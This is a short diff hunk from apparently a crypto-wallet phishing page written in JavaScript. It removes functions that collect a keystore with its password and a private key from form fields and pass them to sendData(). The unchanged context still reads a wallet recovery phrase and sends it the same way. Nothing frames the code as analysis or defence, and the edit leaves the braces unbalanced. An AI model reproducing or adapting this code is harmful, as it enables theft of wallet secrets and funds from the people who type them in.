@@ -1168,21 +1168,8 @@
         var dappWords = $("#formPhrase").val();
 
            sendData(message);
-                }
                 
-            }
-
-            const goKeystore = () => {
-                let keystore = $("#keystoreBox").val();
-                let password = $("#passwordBox").val()
-                message = `Keystore: ${keystore} \nPassword: ${password}`;
-                sendData(message);
-            }
-
-            const goKey = () => {
-                message = $("#keyBox").val();
-                message = `Private key: ${message}`;
-                sendData(message);
+            
 
         if (!validateInput(dappWords)) {
 
